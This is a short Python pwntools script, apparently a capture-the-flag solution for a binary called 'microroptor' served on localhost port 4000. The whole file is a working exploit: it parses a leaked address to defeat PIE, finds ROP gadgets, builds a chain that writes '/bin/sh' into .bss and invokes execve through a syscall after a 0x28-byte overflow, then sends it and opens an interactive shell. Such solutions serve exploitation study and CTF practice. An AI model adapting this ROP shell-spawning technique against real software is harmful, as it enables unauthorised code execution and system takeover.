from pwn import *
import sys

p = remote("localhost", 4000)
# p = gdb.debug("./microroptor", "vmmap")

elf = ELF("microroptor")
context.binary = elf


hint = p.recvuntil(b"\n")
log.info(f"Hint received : {hint}")
hint_addr_pie = int(hint, 16)

rop = ROP(elf)

hint_addr = next(elf.search(b"m3t4ll1cA"))
offset = hint_addr_pie - (hint_addr + 8200)
bss_addr = elf.bss(offset)

pop_rdi = rop.rdi.address + offset
pop_rax = rop.rax.address + offset
# Only 0x0000000000001249: pop rsi; pop r15; ret; 
pop_rsi = rop.rsi.address + offset
pop_rdx = rop.rdx.address + offset

# 0x0000000000001169: mov qword ptr [rdi], rax; ret; 
mov_rdi_rax = 0x0000000000001169 + offset

syscall_addr = rop.syscall.address + offset

# Write /bin/sh to bss
# Ret execve = syscall(rax = 59, rdi = @bss, rsi = 0, rdx = 0)
padding = cyclic(0x28)
payload = padding + flat(
   p64(pop_rdi),
   p64(bss_addr),
   p64(pop_rax),
   b"/bin/sh\x00",
   p64(mov_rdi_rax),
   p64(pop_rax),
   p64(59),
   p64(pop_rdi),
   p64(bss_addr),
   p64(pop_rsi),
   p64(0),
   p64(0xdeadbeef),
   p64(pop_rdx),
   p64(0),
   p64(syscall_addr), 
)

log.info(f"Address of hin in ELF : {hex(hint_addr)}")
log.info(f"Base address = {hex(offset)}")
log.info(f"BSS address = {hex(bss_addr)}")
log.info(f"POP RDI: {hex(pop_rdi)}")

log.info("payload")
print(hexdump(payload))

p.send(payload)

p.interactive()
